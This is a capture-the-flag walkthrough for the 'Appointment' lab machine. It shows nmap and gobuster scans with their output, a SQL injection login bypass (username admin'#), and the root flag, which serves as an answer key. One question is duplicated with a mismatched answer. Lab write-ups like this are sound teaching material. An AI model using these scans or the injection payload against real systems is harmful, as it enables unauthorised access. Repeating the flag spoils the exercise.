#### Guide on APPOINTMENT CTF Machine

Gobuster is used for brute-forcing directories on a web server.

1. What does the acronym SQL stand for?<br>
structured query language

2. What is one of the most common type of SQL vulnerabilities?<br>
sql injection

3. What is the 2021 OWASP Top 10 classification for this vulnerability?<br>
A03:2021-Injection

4. What does Nmap report as the service and version that are running on port 80 of the target?<br>
Apache httpd 2.4.38 ((Debian))

	```bash
	nmap -p 80 -sV 10.129.79.112
	Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 11:47 PST
	Nmap scan report for 10.129.79.112
	Host is up (0.24s latency).

	PORT   STATE SERVICE VERSION
	80/tcp open  http    Apache httpd 2.4.38 ((Debian))
	```
	
5. What is the standard port used for the HTTPS protocol?<br>
443
	- the standard port for http is 80 while in https it is 443	
	
6. What is a folder called in web-application terminology?<br>
directory

7. What is a folder called in web-application terminology?<br>
404

8. Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?<br>
dir

	```bash
	gobuster dir -u http://10.129.15.211/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
	===============================================================
	Gobuster v3.6
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.129.15.211/
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.6
	[+] Timeout:                 10s
	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	/images               (Status: 301) [Size: 315] [--> http://10.129.15.211/images/]
	/css                  (Status: 301) [Size: 312] [--> http://10.129.15.211/css/]
	/js                   (Status: 301) [Size: 311] [--> http://10.129.15.211/js/]
	/vendor               (Status: 301) [Size: 315] [--> http://10.129.15.211/vendor/]
	/fonts                (Status: 301) [Size: 314] [--> http://10.129.15.211/fonts/]
	Progress: 16826 / 87665 (19.19%)
	```

9. What single character can be used to comment out the rest of a line in MySQL?<br>
#

10. If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?<br>
congratulations

	- go to the login page of the website and do an sql injection
	user: admin'#
	pass: anypassword
	
	- this will comment out the password and only login using the user
	SELECT * FROM users WHERE username='admin'#' AND password='anypassword'
	
11. Submit root flag<br>
e3d0796d002a446c0e622226f42e9672




	
	
	
